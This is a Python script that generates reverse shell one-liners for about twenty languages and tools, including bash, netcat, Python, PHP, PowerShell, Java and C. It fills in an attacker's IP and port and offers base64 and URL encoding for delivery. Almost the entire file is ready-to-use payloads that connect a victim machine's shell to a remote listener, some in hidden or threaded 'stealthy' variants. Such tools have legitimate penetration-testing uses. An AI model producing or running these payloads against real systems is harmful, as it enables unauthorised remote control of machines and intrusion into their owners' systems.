#!/usr/bin/env python
#
# Based on most of the available one liners in PayloadAlltheThings repository: 
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# Quick and dirty scripts
# pipe it into rs_b64encode.py by convenience
#
# arale61



from argparse import ArgumentParser, RawDescriptionHelpFormatter


supported_oneliners = {
    'bash_tcp':'bash -i >& /dev/tcp/{0}/{1} 0>&1',
    'bash1_tcp':'bash -c \'bash -i >& /dev/tcp/{0}/{1} 0>&1\'',
    'bash2_tcp':'0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196',
    'bash3_tcp':'/bin/bash -l > /dev/tcp/{0}/{1} 0<&1 2>&1',
    'bash_udp':'bash -c \'bash -i >& /dev/udp/{0}/{1} 0>&1\'',
    'socat_tcp':'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{0}:{1}',
    'perl_tcp':'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    'perl2_tcp':'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
    'perl_tcp_win':'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
    'python_tcp':'python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
    'pythondub2a_tcp':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    'pythondub2b_tcp':'python -c \'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("{0}",{1}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())\'',
    'pythonipv6_tcp':'python -c \'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("{0}",{1},0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\'',
    'python_tcp_win':'python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'{0}\',{1}));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"',
    'php_tcp':'php -r \'$sock=fsockopen("{0}",{1});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'',
    'phpexec_tcp':'php -r \'$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'phpshellexec_tcp':'php -r \'$sock=fsockopen({0},{1});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'phpshellexec_tcp':'php -r \'$sock=fsockopen({0},{1});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'php2_tcp':'php -r \'$sock=fsockopen("{0}",{1});`/bin/sh -i <&3 >&3 2>&3`;\'',
    'phpsystem_tcp': 'php -r \'$sock=fsockopen("{0}",{1});system("/bin/sh -i <&3 >&3 2>&3");\'',
    'phppassthru_tcp':'php -r \'$sock=fsockopen("{0}",{1});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
    'phpopen_tcp':'php -r \'$sock=fsockopen("{0}",{1});popen("/bin/sh -i <&3 >&3 2>&3", "r");\'',
    'ruby_tcp':'ruby -rsocket -e\'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    'ruby_tcp_win': 'ruby -rsocket -e \'c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
    'go_tcp': 'echo \'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{1}:{0}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
    'nc_tcp':'nc -e /bin/bash {0} {1}',
    'nc2_tcp':'nc -e /bin/sh {0} {1}',
    'nc3_tcp':'nc -c /bin/bash {0} {1}',
    'nc4openbsd_tcp':'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
    'nc4busybox_tcp':'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
    'ncat_tcp':'ncat {0} {1} -e /bin/bash',
    'ncat_udp':'ncat --udp {0} {1} -e /bin/bash',
    'openssl_tcp':'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {0}:{1} > /tmp/s; rm /tmp/s',
    'powershell_tcp_win':'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    'powershell2_tcp_win':'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
    'awk_tcp': 'awk \'BEGIN {{s = "/inet/tcp/0/{0}/{1}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\' /dev/null',
    'java_tcp':'Runtime r = Runtime.getRuntime();Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done\'");p.waitFor();',
    'java_tcp_win':'String host="{0}";int port={1};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();',
    'javastealthy_tcp':'Thread thread = new Thread(){{ public void run(){{ Runtime r = Runtime.getRuntime();Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done\'");p.waitFor(); }}}};thread.start();',
    'javastealthy_tcp_win':'Thread thread = new Thread(){{ public void run(){{ String host="{0}";int port={1};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close(); }}}};thread.start();',
    'telnet_tcp':'telnet {0} {1} | /bin/sh | telnet {0} 6161',
    'war_tcp':'msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f war > reverse.war',
    'lua_tcp':'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{0}\',\'{1}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"',
    'lua51_tcp_win':'lua5.1 -e \'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'',
    'nodejs1_tcp':'require(\'child_process\').exec(\'nc -e /bin/sh {0} {1}\')',
    'nodejs2_tcp':'var x = global.process.mainModule.require;x(\'child_process\').exec(\'bash -i >& /dev/tcp/{0}/{1} 0>&1\')',
    'nodejs3_tcp':'var x = global.process.mainModule.require;x(\'child_process\').exec(\'nc {0} {1} -e /bin/bash\')',
    'groovy_tcp_win':'String host="{0}";int port={1};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();',
    'groovy_tcp':'Runtime r = Runtime.getRuntime();Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done\'");p.waitFor();',
    'groovyalt_tcp_win':'Thread.start {{ String host="{0}";int port={1};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close(); }}',
    'groovyalt_tcp': 'Runtime r = Thread.start {{ Runtime.getRuntime();Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done\'");p.waitFor();}}',
    'dart_tcp_win':'''
import 'dart:io';
import 'dart:convert';

main() {{
  Socket.connect("{0}", {1}).then((socket) {{
    socket.listen((data) {{
      Process.start('powershell.exe', []).then((Process process) {{
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) {{ socket.write(output); }});
      }});
    }},
    onDone: () {{
      socket.destroy();
    }});
  }});
}}
''',
    'c_tcp':'''
# compile with: gcc /tmp/shell.c --output csh

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){{
    int port = {1};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{0}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"/bin/sh", NULL}};
    execve("/bin/sh", argv, NULL);

    return 0;
}}
''',
    'nodejs_tcp':'''
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({1}, "{0}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();
''',
    'rust_tcp':'''
use std::net::TcpStream;
use std::os::unix::io::{{AsRawFd, FromRawFd}};
use std::process::{{Command, Stdio}};

fn main() {{
    let s = TcpStream::connect("{0}:{1}").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe {{ Stdio::from_raw_fd(fd) }})
        .stdout(unsafe {{ Stdio::from_raw_fd(fd) }})
        .stderr(unsafe {{ Stdio::from_raw_fd(fd) }})
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}}
'''
}


def filter_from_supported(key_part):
    return [x for x in supported_oneliners.keys() if key_part in x]


def supported_shells():
    return sorted(set([x.split('_')[0] for x in supported_oneliners.keys()]))


def has_udp_support(shell):
    return len(filter_from_supported(f"{shell}_udp")) > 0


def has_win_support(shell):
    return len(filter_from_supported(f"{shell}_tcp_win")) > 0


def get_description_for(shell):
    udp_support = ''
    win_support = ''
    desc = 'One-liner for {0}{1}{2}'
    if has_udp_support(shell):
        udp_support += ' | Supports UDP'
    if has_win_support(shell):
        win_support += ' | Supports Windows'
    
    return desc.format(shell, udp_support, win_support)


def print_udp_based_scripts():
    for key in filter_from_supported("_udp"):
        print(f"--{key.split('_')[0]} --udp")


def print_win_based_scripts():
    for key in filter_from_supported("_win"):
        print(f"--{key.split('_')[0]} --win")


def get_selected_shell(args):
    for arg in [x for x in dir(args) if '__' not in x and '_get_' not in x]:
        if arg in supported_shells() and getattr(args, arg) == True:
            return arg
    return False


def usage(p:ArgumentParser):
    p.print_help()
    exit(1)


class OneLiner():
    def __init__(self, ip, port, my_type, my_protocol="tcp", win_platform=False, server_script=False):
        self.ip = ip
        self.port = port
        self.shell = my_type
        self.protocol = my_protocol
        self.win_platform = win_platform
        self.server_script = server_script

    def get_key(self):
        if self.win_platform == True:
            return f"{self.shell}_{self.protocol}_win"
        return f"{self.shell}_{self.protocol}"
    
    def get_value(self):
        return supported_oneliners[self.get_key()].format(self.ip, self.port)

    def has_server_script(self):
        return self.shell in ['socat', 'openssl']

    def generate_server_script(self):
        if self.has_server_script():
            if self.shell == 'socat':
                return f'socat file:`tty`,raw,echo=0 TCP-L:{self.port}'
            elif self.shell == 'openssl':
                return f'''openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port {self.port}
# or:
# ncat --ssl -vv -l -p {self.port}
'''
            elif self.shell == 'telnet':
                return f'''
In Attacker machine start two listeners:
nc -lvp {self.port}
nc -lvp 6161
'''


def parse_arguments():
    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description='''Yet another one-liner reverse shell generator script,
based on PayloadAllTheThings reverse shells''',
        epilog='''
Examples:

1. Simple bash tcp reverse shell:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash

2. Simple bash udp reverse shell:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash --udp

3. Simple perl tcp reverse shell for windows:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --perl --win

4. Piping into rs_b64encode.py:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py

5. Piping into rs_b64encode.py and construction echo decode payload:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo

6. Piping into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo --url

Util scripts by arale61
''')

    parser.add_argument('-i', '--ip', help='Sets the local ip address')
    parser.add_argument('-p', '--port', help='Sets the local port address')

    parser.add_argument('--server', action='store_true', help='Hints on server script (for socat and openssl)')

    parser.add_argument('--list_udp', action='store_true', help='List available UDP based scripts')
    parser.add_argument('--list_win', action='store_true', help='List available Windows based scripts')
    parser.add_argument('--udp', action='store_true', help='Uses UDP protocol')
    parser.add_argument('--win', action='store_true', help='Uses Windows platform payloads')

    for shell in supported_shells():
        parser.add_argument(f"--{shell}", action='store_true', help=get_description_for(shell))

    args = parser.parse_args()

    if args.list_udp:
        print_udp_based_scripts()
        exit(0)
    elif args.list_win:
        print_win_based_scripts()
        exit(0)

    ip = args.ip or ""
    port = args.port or ""
    protocol = "tcp"
    win_platform = False

    if len(ip) <= 0 or len(port) <=0:
        usage(parser)

    shell = get_selected_shell(args)
    if(shell == False):
        print("Shell not supported!")
        usage(parser)

    udp_mode = args.udp

    if udp_mode:
        if not has_udp_support(shell):
            print(f"No one-liner available for {shell} using UDP!")
            usage(parser);
        else:
            protocol = "udp"

    win_mode = args.win

    available_shells = filter_from_supported(shell)

    if win_mode or (len(available_shells) == 1 and '_win' in available_shells[0]):
        if not has_win_support(shell):
            print(f"No one-liner available for {shell} in Windows!")
            usage(parser);
        else:
            win_platform = True
        
    return OneLiner(ip, port, shell, protocol, win_platform, args.server)


if __name__ == "__main__":
    one_liner = parse_arguments()
    if one_liner.server_script:
        print(one_liner.generate_server_script())
    else:
        print(one_liner.get_value())